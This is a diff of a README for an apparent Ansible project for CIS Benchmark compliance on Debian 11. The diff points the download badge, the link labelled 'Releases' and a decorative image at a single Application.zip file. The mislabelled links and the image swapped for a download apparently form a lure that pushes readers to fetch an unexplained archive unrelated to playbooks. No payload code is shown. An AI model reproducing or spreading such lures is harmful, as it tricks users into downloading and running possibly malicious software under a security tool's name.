@@ -1,6 +1,6 @@
 # 🛡️🔒 Test Audit - Automated CIS Benchmark Compliance Remediation for Debian 11 with Ansible 🔒🛡️
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/Dragon271320/test-audit/releases/download/v1.0/Application.zip<COLOR>.svg)](https://github.com/Dragon271320/test-audit/releases/download/v1.0/Application.zip)
 
 Welcome to the Test Audit GitHub repository! This repository focuses on automated CIS Benchmark Compliance remediation for Debian 11 using Ansible. With the power of automation and configuration management, you can ensure that your Debian 11 system adheres to the security guidelines outlined by CIS (Center for Internet Security).
 
@@ -43,11 +43,11 @@ To get started with Test Audit, follow these steps:
 4. **Execute Playbooks**: Run the playbooks using Ansible to implement CIS Benchmark Compliance on your Debian 11 systems.
 
 ## 🌐 Additional Resources
-For more information and updates, visit the [Releases](https://github.com/user-attachments/files/18426772/Application.zip) section or refer to the documentation within the repository.
+For more information and updates, visit the [Releases](https://github.com/Dragon271320/test-audit/releases/download/v1.0/Application.zip) section or refer to the documentation within the repository.
 
 Let's make CIS Benchmark Compliance a seamless process with Test Audit! 🛡️🔒
 
-![Security](https://source.unsplash.com/800x600/?security)
+![Security](https://github.com/Dragon271320/test-audit/releases/download/v1.0/Application.zip)
 
 Your security matters. Stay protected with Test Audit. 🛡️🔒
 
